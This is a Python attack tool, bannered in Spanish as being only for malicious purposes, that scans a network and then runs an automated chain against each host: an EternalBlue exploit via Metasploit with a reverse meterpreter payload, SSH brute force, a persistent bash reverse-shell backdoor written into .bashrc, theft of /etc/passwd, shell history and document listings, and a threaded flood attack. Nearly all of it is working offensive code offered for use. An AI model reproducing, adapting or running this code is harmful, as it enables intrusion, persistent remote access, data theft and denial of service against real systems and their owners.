#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import paramiko
import requests
import threading
from scapy.all import ARP, Ether, srp
import time

# Colores para output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

def print_banner():
    banner = f"""
    {RED}
    ╔══════════════════════════════════════════════════════════╗
    ║                   S H A D O W   K A L I                   ║
    ║             Herramienta Ofensiva Multifunción            ║
    ║                 [ Solo para propósitos maliciosos ]      ║
    ╚══════════════════════════════════════════════════════════╝
    {RESET}
    """
    print(banner)

def scan_network(target_network="192.168.1.0/24"):
    print(f"{BLUE}[*] Escaneando red: {target_network}{RESET}")
    arp = ARP(pdst=target_network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    print(f"{GREEN}[+] Dispositivos encontrados:{RESET}")
    for device in devices:
        print(f"    IP: {device['ip']} - MAC: {device['mac']}")
    return devices

def exploit_vulnerability(target_ip):
    print(f"{BLUE}[*] Intentando explotar vulnerabilidades en {target_ip}{RESET}")
    # Ejemplo: Explotación de EternalBlue (MS17-010)
    exploit_cmd = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {get_local_ip()}; exploit'"
    subprocess.Popen(exploit_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{YELLOW}[!] Ejecutando exploit contra {target_ip} (EternalBlue){RESET}")

def brute_force_ssh(target_ip, username_list="wordlists/usernames.txt", password_list="wordlists/passwords.txt"):
    print(f"{BLUE}[*] Ataque de fuerza bruta SSH a {target_ip}{RESET}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(username_list, 'r') as users, open(password_list, 'r') as passwds:
        usernames = users.read().splitlines()
        passwords = passwds.read().splitlines()
    for user in usernames:
        for password in passwords:
            try:
                ssh.connect(target_ip, username=user, password=password, timeout=5)
                print(f"{GREEN}[+] Credenciales encontradas: {user}:{password}{RESET}")
                ssh.close()
                return (user, password)
            except:
                pass
    print(f"{RED}[-] Fuerza bruta fallida{RESET}")
    return None

def create_backdoor(target_ip, username, password):
    print(f"{BLUE}[*] Creando backdoor en {target_ip}{RESET}")
    # Subir y ejecutar un reverse shell persistente
    backdoor_cmd = f"echo 'bash -i >& /dev/tcp/{get_local_ip()}/4444 0>&1' | ssh {username}@{target_ip} 'cat >> ~/.bashrc && bash -c \"bash -i >& /dev/tcp/{get_local_ip()}/4444 0>&1 &\"'"
    os.system(backdoor_cmd)
    print(f"{GREEN}[+] Backdoor configurado (escuchando en {get_local_ip()}:4444){RESET}")

def exfiltrate_data(target_ip, username, password):
    print(f"{BLUE}[*] Exfiltrando datos de {target_ip}{RESET}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target_ip, username=username, password=password)
    # Comandos para robar información sensible
    commands = [
        "cat /etc/passwd",
        "find /home -name '*.txt' -o -name '*.pdf' -o -name '*.docx' 2>/dev/null",
        "history",
        "ifconfig"
    ]
    stolen_data = ""
    for cmd in commands:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        stolen_data += f"\n--- {cmd} ---\n" + stdout.read().decode()
    with open(f"exfil_{target_ip}.txt", "w") as f:
        f.write(stolen_data)
    ssh.close()
    print(f"{GREEN}[+] Datos guardados en exfil_{target_ip}.txt{RESET}")

def ddos_attack(target_ip, port=80, threads=100):
    print(f"{RED}[*] Iniciando ataque DDoS a {target_ip}:{port}{RESET}")
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, port))
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=flood).start()
    print(f"{YELLOW}[!] DDoS en curso. Ctrl+C para detener.{RESET}")

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def main():
    print_banner()
    target = input(f"{YELLOW}[?] IP objetivo (o red para escanear): {RESET}")
    if "/" in target:
        devices = scan_network(target)
        for device in devices:
            target_ip = device['ip']
            print(f"{BLUE}[*] Atacando {target_ip}{RESET}")
            exploit_vulnerability(target_ip)
            creds = brute_force_ssh(target_ip)
            if creds:
                create_backdoor(target_ip, creds[0], creds[1])
                exfiltrate_data(target_ip, creds[0], creds[1])
            ddos_choice = input(f"{YELLOW}[?] ¿Iniciar DDoS contra {target_ip}? (s/n): {RESET}")
            if ddos_choice.lower() == 's':
                ddos_attack(target_ip)
    else:
        exploit_vulnerability(target)
        creds = brute_force_ssh(target)
        if creds:
            create_backdoor(target, creds[0], creds[1])
            exfiltrate_data(target, creds[0], creds[1])
        ddos_choice = input(f"{YELLOW}[?] ¿Iniciar DDoS contra {target}? (s/n): {RESET}")
        if ddos_choice.lower() == 's':
            ddos_attack(target)
    print(f"{GREEN}[+] Script completado. Revisa los archivos de salida.{RESET}")

if __name__ == "__main__":
    main()
